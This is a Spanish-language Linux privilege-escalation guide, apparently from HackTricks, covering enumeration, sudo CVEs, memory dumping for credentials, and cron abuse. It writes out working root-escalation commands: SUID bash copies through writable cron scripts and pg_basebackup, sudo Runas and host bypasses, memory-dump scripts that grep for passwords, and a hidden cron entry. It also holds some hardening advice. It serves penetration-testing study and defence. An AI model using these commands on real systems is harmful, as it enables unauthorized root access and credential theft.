# Escalada de privilegios en Linux

{{#include ../../../banners/hacktricks-training.md}}

Para obtener más contexto y consultar flujos históricos de enumeración, compara los recursos de g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation y linux-private-i que aparecen en las referencias.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Información del sistema

### Información del SO

Empecemos por conocer un poco el SO en ejecución.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ruta

Si **tienes permisos de escritura en alguna carpeta incluida en la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:

```bash
echo $PATH
```

### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?

```bash
(env || set) 2>/dev/null
```

### Exploits del kernel

Comprueba la versión del kernel y si hay algún exploit que pueda usarse para escalar privilegios.

La [sección Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) recopila casos de escalada local y enlaces a análisis más detallados del kernel de Linux en Binary Exploitation. Verifica la compilación y la configuración afectadas antes de probar un caso práctico.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [sploits de exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Otros sitios donde puedes encontrar **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones vulnerables del kernel de ese sitio, puedes hacer lo siguiente:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Las herramientas que pueden ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima; solo comprueba exploits para el kernel 2.x)

Busca siempre **la versión del kernel en Google**; puede que la versión de tu kernel aparezca en algún exploit y así tendrás la certeza de que es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versión de Sudo

Según las versiones vulnerables de sudo que aparecen en:

```bash
searchsploit sudo
```

Puedes comprobar si la versión de sudo es vulnerable usando este grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** permite que usuarios locales sin privilegios escalen a root mediante la opción `--chroot` cuando sudo carga `/etc/nsswitch.conf` desde un directorio controlado por el usuario; upstream corrigió esto en **1.9.17p1**. Comprueba todos los binarios sudo ejecutables con setuid de root en las rutas relevantes, ya que `sudo -V` solo informa sobre el binario seleccionado por `PATH`. Los paquetes de las distribuciones pueden aplicar el arreglo mediante un backport sin cambiar la cadena de versión upstream, así que verifica también el estado del paquete del proveedor. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Aquí tienes un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y admita la función `chroot`.  

Para más información, consulta el [aviso original de la vulnerabilidad](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Omisión de reglas de sudo basadas en el host (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** puede evaluar las reglas de sudoers basadas en el host usando el **nombre de host proporcionado por el usuario** en `sudo -h <host>` en lugar del **nombre de host real**; upstream corrigió esto en **1.9.17p1**. El usuario aún debe tener una entrada sudoers coincidente en el host seleccionado. Revisa también los backports de los proveedores y los binarios sudo alternativos, además de la política local. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas del host (el host no es el nombre de host actual ni `ALL`)

Ejemplo de patrón sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit mediante spoofing del host permitido:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Si la resolución del nombre seleccionado se bloquea, verifica cómo se resuelve ese nombre en el host. Que un nombre aparezca en un registro o archivo de configuración no significa que pueda resolverse, y modificar `/etc/hosts` normalmente requiere acceso de escritura privilegiado.

#### sudo < v1.8.28

Este [bypass de Runas UID upstream](https://ubuntu.com/security/CVE-2019-14287) requiere una regla sudo efectiva que permita ejecutar un comando como cualquier usuario excepto root, por ejemplo, `(ALL, !root) /bin/bash`. La persona que ejecuta el comando también debe tener permiso para usar esa regla, incluidos los requisitos de autenticación. Consulta el aviso de seguridad del paquete instalado: los proveedores incorporaron el arreglo a versiones cuya versión upstream indicada sigue siendo anterior a la 1.8.28. Una regla `!root` o una versión antigua por sí sola no confirma que el sistema sea vulnerable. No pruebes un comando privilegiado durante la enumeración pasiva.

```
sudo -u#-1 /bin/bash
```

### Error en la verificación de la firma de Dmesg

Consulta la **máquina smasher2 de HTB** para ver un **ejemplo** de cómo se podría explotar esta vulnerabilidad.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Más enumeración del sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerar las posibles defensas

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Si estás dentro de un contenedor, empieza por la siguiente sección sobre seguridad de contenedores y luego pasa a las páginas sobre abuso específicas del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Comprueba **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y buscar información privada.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software útil

Enumerar binarios útiles

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Además, comprueba si hay **algún compilador instalado**. Esto es útil si necesitas usar algún exploit del kernel, ya que se recomienda compilarlo en la máquina donde vayas a usarlo (o en una similar).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Quizá haya una versión antigua de Nagios (por ejemplo) que se pueda explotar para escalar privilegios…\
Se recomienda comprobar manualmente la versión del software instalado que parezca más sospechoso.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software obsoleto y vulnerable instalado en ella.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que, en su mayoría, será inútil. Por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares, que comprueben si alguna versión del software instalado es vulnerable a exploits conocidos._

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si alguno tiene **más privilegios de los que debería** (¿quizás un tomcat ejecutado por root?).

```bash
ps aux
ps -ef
top -n 1
```

Comprueba siempre si hay [**depuradores de electron/cef/chromium** en ejecución; podrías aprovecharlos para escalar privilegios](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta buscando el parámetro `--inspect` en la línea de comandos del proceso.\
Comprueba también **tus privilegios sobre los binarios de los procesos**; quizá puedas sobrescribir alguno.

### Cadenas de procesos padre-hijo entre usuarios

Que un proceso hijo se ejecute con un **usuario distinto** al de su proceso padre no es automáticamente malicioso, pero sí es una **señal útil para el triaje**. Algunas transiciones son esperables (`root` inicia un servicio con otro usuario, los gestores de inicio de sesión crean procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, helpers de depuración, persistencia o límites de confianza débiles en tiempo de ejecución.

Revisión rápida:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo, argumentos modificables). En varias rutas reales de privesc, el proceso hijo no se podía modificar, pero sí la **configuración controlada por el proceso padre** o la cadena de scripts auxiliares.

### Ejecutables eliminados y archivos abiertos eliminados

A menudo, los artefactos en tiempo de ejecución siguen siendo accesibles **incluso después de eliminarlos**. Esto resulta útil tanto para la escalada de privilegios como para recuperar pruebas de un proceso que ya tiene abiertos archivos sensibles.

Comprueba si hay ejecutables eliminados:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Es una señal clara que conviene investigar porque:

- el ejecutable eliminado puede contener cadenas o credenciales interesantes
- el proceso en ejecución aún puede exponer descriptores de archivo útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o un intento de limpieza

Recopila globalmente los archivos eliminados que siguen abiertos:

```bash
lsof +L1
```

Si encuentras un descriptor interesante, recupéralo directamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Esto es especialmente valioso cuando un proceso todavía tiene abierto un secreto eliminado, un script, una exportación de base de datos o un archivo con flags.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen ciertos requisitos.

#### ProcMon de Linux con sudo

[ProcMon para Linux](https://github.com/microsoft/ProcMon-for-Linux) puede rastrear procesos y llamadas al sistema seleccionados y guardar un trace de SQLite. Si `sudo -l` permite ejecutar sin restricciones el comando `procmon` con capacidad de root, considera si podría observar la entrada o salida del proceso de otro usuario. Este permiso es solo una pista para revisar: el soporte del tracer, la política efectiva y la actividad de un proceso adecuado son factores importantes. Los archivos de trace pueden contener secretos, así que inspecciona cuidadosamente las exportaciones autorizadas y evita recopilar datos de procesos no relacionados.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios; por lo tanto, esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: se pueden depurar todos los procesos, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo se puede depurar un proceso padre.
> - **kernel.yama.ptrace_scope = 2**: solo el administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede rastrear ningún proceso con ptrace. Una vez establecido, es necesario reiniciar el sistema para volver a habilitar ptracing.

Un proceso con el mismo UID que desbloquea brevemente una bóveda de contraseñas puede constituir un límite de credenciales independiente. Cuando se permite el tracing, un proceso activo que permita volcados puede exponer la contraseña de la bóveda mediante sus llamadas al sistema de entrada o su memoria, aunque el archivo cifrado de la bóveda siga protegido. `ptrace_scope=0` es solo un requisito previo: también importan que las credenciales coincidan, que el proceso objetivo permita volcados, otros módulos de seguridad de Linux y el tiempo de vida del proceso. Que una entrada de la bóveda pueda usarse para iniciar sesión como root en Unix requiere una comprobación independiente de reutilización de credenciales. La enumeración rutinaria debería informar de la política y de las rutas candidatas de procesos o bóvedas, no capturar entradas ni mostrar secretos. Consulta la [documentación de Yama del kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) y las [comprobaciones de acceso de ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar sus credenciales.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script de GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso determinado, **maps muestra cómo está mapeada la memoria dentro del espacio de direcciones virtuales de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la memoria del propio proceso**. A partir del archivo **maps**, sabemos qué **regiones de memoria son legibles** y cuáles son sus desplazamientos. Usamos esta información para **buscar en el archivo mem y volcar todas las regiones legibles** en un archivo.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. Se puede acceder al espacio de direcciones virtuales del kernel mediante /dev/kmem.\
Normalmente, solo **root** y el grupo **kmem** pueden leer `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump para Linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Descárgalo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Herramientas

Para volcar la memoria de un proceso, puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso authenticator está en ejecución:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Puedes volcar el proceso (consulta las secciones anteriores para encontrar distintas formas de volcar la memoria de un proceso) y buscar credenciales en la memoria:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto sin cifrar de la memoria** y de algunos **archivos conocidos**. Requiere privilegios de root para funcionar correctamente.

| Característica                                      | Nombre del proceso   |
| --------------------------------------------------- | -------------------- |
| Contraseña de GDM (escritorio de Kali, Debian)      | gdm-password         |
| Gnome Keyring (escritorio de Ubuntu, ArchLinux)     | gnome-keyring-daemon |
| LightDM (escritorio de Ubuntu)                     | lightdm              |
| VSFTPd (conexiones FTP activas)                     | vsftpd               |
| Apache2 (sesiones de autenticación básica HTTP activas) | apache2          |
| OpenSSH (sesiones SSH activas - uso de Sudo)        | sshd:                |

#### Expresiones regulares de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Trabajos programados/Cron

### Crontab UI (alseambusher) ejecutándose como root – privesc mediante scheduler web

Si un panel web de “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está vinculado a loopback, aún puedes acceder a él mediante un reenvío de puerto local por SSH y crear un trabajo privilegiado para escalar.<sup>[[1]](#references)[[4]](#references)</sup>

Cadena típica
- Descubre un puerto accesible solo desde loopback (p. ej., 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encuentra credenciales en artefactos operativos:
  - Copias de seguridad/scripts con `zip -P <password>`
  - Una unidad de systemd que exponga `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crea un túnel e inicia sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un job con altos privilegios y ejecutarlo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- No ejecutes Crontab UI como root; limita su uso con un usuario dedicado y permisos mínimos
- Vincúlalo a localhost y restringe además el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incluir secretos en los archivos de unit; usa almacenes de secretos o un EnvironmentFile accesible solo para root
- Habilita la auditoría y el registro de ejecuciones de jobs bajo demanda

Comprueba si algún job programado es vulnerable. Quizá puedas aprovecharte de un script ejecutado por root (¿vulnerabilidad de wildcard? ¿puedes modificar archivos que usa root? ¿usar symlinks? ¿crear archivos específicos en el directorio que usa root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Si se usa `run-parts`, comprueba qué nombres se ejecutarán realmente:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Esto evita falsos positivos. Un directorio periódico con permisos de escritura solo es útil si el nombre de tu payload coincide con las reglas locales de `run-parts`.

### Ruta de cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa que el usuario "user" tiene permisos de escritura sobre /home/user_)

Si en este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell de root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron usando un script con un comodín (Wildcard Injection)

Si un script ejecutado por root contiene un «**\***» dentro de un comando, podrías aprovecharlo para hacer cosas inesperadas (como privesc). Ejemplo:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Si el wildcard va precedido de una ruta como** _**/some/path/\***_ **, no es vulnerable (ni siquiera** _**./\***_ **).**

Lee la siguiente página para ver más trucos de explotación de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Inyección en la expansión aritmética de Bash en analizadores de logs de cron

Bash puede interpretar texto no confiable como una expresión aritmética. En ciertos contextos de Bash vulnerables, un subíndice de array dentro de esa expresión puede evaluar una sustitución de comandos. Si un analizador privilegiado de cron incluye texto de logs controlado por un atacante en una comparación aritmética de este tipo, la sustitución puede ejecutarse con la identidad del analizador.<sup>[[22]](#references)</sup> Esto depende de la expresión exacta de Bash y de la versión; una cadena `$(...)0` aislada en una variable expandida no demuestra por sí sola que se vuelva a evaluar de forma fiable.

La entrada también puede proceder de metadatos de archivos u otro campo leído desde una ubicación en la que un usuario pueda escribir. Por ejemplo, un script de limpieza privilegiado que lee una etiqueta `Producer` de una imagen y la compara con `[[ "$producer" -eq "expected" ]]` realiza una comparación aritmética, aunque la variable esté entre comillas. Determina la identidad con la que se ejecuta la tarea programada, qué archivos pueden proporcionar la etiqueta, qué transformaciones se aplican antes de la comparación y cuál es el comportamiento exacto de Bash. Para etiquetas de texto, usa una comparación de cadenas; para números, valida que la entrada contenga solo dígitos decimales antes de realizar operaciones aritméticas. Consulta las [reglas aritméticas de Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Patrón vulnerable típico:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sonda segura del comportamiento local del mecanismo de subíndice de array (sin procesos privilegiados ni cambios en archivos):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Rastrea el script programado real y la ruta literal de entrada que abre. Aunque el archivo de log no tenga permisos de escritura, un usuario que pueda escribir y recorrer su directorio padre, si no tiene sticky bit, podría reemplazar su entrada de directorio; `namei -l` ayuda a distinguir esos permisos. Una ruta de log distinta que sí permita escritura, un scheduler que no se pueda leer o un parser que nunca evalúe ese campo como aritmética de Bash no demuestran que esta vía sea posible.

### Sobrescritura de script de Cron y symlink

Si **puedes modificar un script de cron** que se ejecuta como root, puedes obtener una shell muy fácilmente:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Si el script ejecutado por root usa un **directorio al que tienes acceso completo**, quizá te resulte útil eliminar esa carpeta y **crear un enlace simbólico a otra carpeta** que sirva un script controlado por ti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validación de enlaces simbólicos y manejo más seguro de archivos

Al revisar scripts/binarios privilegiados que leen o escriben archivos por ruta, verifica cómo se manejan los enlaces:

- `stat()` sigue un enlace simbólico y devuelve los metadatos del destino.
- `lstat()` devuelve los metadatos del propio enlace.
- `readlink -f` y `namei -l` ayudan a resolver el destino final y muestran los permisos de cada componente de la ruta.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Para los defensores/desarrolladores, algunos patrones más seguros frente a trucos con symlinks son:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea los links/archivos creados previamente por un atacante).
- `openat()`: opera en relación con un descriptor de archivo de un directorio de confianza.
- `mkstemp()`: crea archivos temporales de forma atómica y con permisos seguros.

### Binarios de cron con firma personalizada y payloads modificables
Un usuario normal que pueda escribir en el binario exacto que ejecuta un cron job de root puede cruzar un límite de privilegios, pero una verificación de firma personalizada puede rechazar un reemplazo sin firmar. En el caso documentado, el ELF propiedad de root tenía el modo `0760`, que permitía a un miembro de su grupo modificarlo, mientras que el propietario root podía ejecutarlo. Un rastreo visible de procesos mostró que `objcopy` extraía `.text_sig` antes de que el job ejecutara el binario; el script verificador completo no se podía leer.<sup>[[2]](#references)</sup>

El reemplazo que funcionó se firmó con material privado de firma leaked mediante un ELF signer. Su [documentación del formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describe una sección de firma derivada de `.text` del ejecutable. No se muestra que añadir simplemente un certificado o una cadena coincidente a `.text_sig` baste para satisfacer el verificador, que no se pudo examinar. Antes de concluir que un binario modificable y firmado es explotable, comprueba la ruta programada real, los permisos efectivos de escritura, la invocación de root y la política del verificador. Una sección `.text_sig`, por sí sola, es solo una pista para la revisión.

### Jobs de cron frecuentes

Puedes monitorizar los procesos para buscar procesos que se ejecuten cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1s durante 1 minuto**, **ordenar de menor a mayor cantidad de ejecuciones** y eliminar los comandos que se hayan ejecutado más veces, puedes hacer lo siguiente:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Backups de root que preservan los bits de modo establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes colocar un **binario SUID/SGID** que se volverá a copiar como **root:root**, conservando los mismos bits de modo en el destino del backup.<sup>[[26]](#references)</sup>

Flujo típico de descubrimiento (como usuario de base de datos con pocos privilegios):
- Usa `pspy` para detectar un cron de root que ejecuta algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que puedes escribir en el clúster de origen (p. ej., `/var/lib/postgresql/14/main`) y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después de que se ejecute la tarea.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Esto funciona porque `pg_basebackup` conserva los bits de modo de archivo al copiar el clúster; cuando lo ejecuta root, los archivos de destino heredan **la propiedad de root + SUID/SGID elegidos por el atacante**. Cualquier rutina similar de copia o backup con privilegios que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Trabajos cron invisibles

Es posible crear un trabajo cron **poniendo un retorno de carro después de un comentario** (sin carácter de salto de línea), y el trabajo cron funcionará. Ejemplo (observa el carácter de retorno de carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Para detectar este tipo de entrada sigilosa, inspecciona los archivos cron con herramientas que muestren los caracteres de control:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
